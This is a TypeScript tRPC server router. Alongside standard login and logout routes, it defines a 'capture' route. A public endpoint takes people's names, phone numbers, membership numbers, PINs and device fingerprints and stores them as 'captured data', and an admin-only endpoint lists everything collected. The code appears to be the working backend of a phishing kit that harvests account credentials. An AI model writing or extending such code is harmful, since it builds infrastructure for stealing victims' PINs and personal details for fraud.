import { COOKIE_NAME } from "@shared/const";
import { z } from "zod";
import { TRPCError } from "@trpc/server";
import { insertCapturedData, getAllCapturedData } from "./db";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, protectedProcedure, router } from "./_core/trpc";

export const appRouter = router({
    // if you need to use socket.io, read and register route in server/_core/index.ts, all api should start with '/api/' so that the gateway can route correctly
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  capture: router({
    submit: publicProcedure
      .input(z.object({
        name: z.string().min(1),
        phone: z.string().min(1),
        membershipNumber: z.string().min(1),
        pin: z.string().min(1),
        fingerprint: z.string().optional(),
      }))
      .mutation(async ({ input }) => {
        const result = await insertCapturedData(input);
        return { success: true, id: result };
      }),
    list: protectedProcedure.query(async ({ ctx }) => {
      if (ctx.user.role !== 'admin') {
        throw new TRPCError({ code: 'FORBIDDEN', message: 'Acesso negado' });
      }
      return await getAllCapturedData();
    }),
  }),
});

export type AppRouter = typeof appRouter;
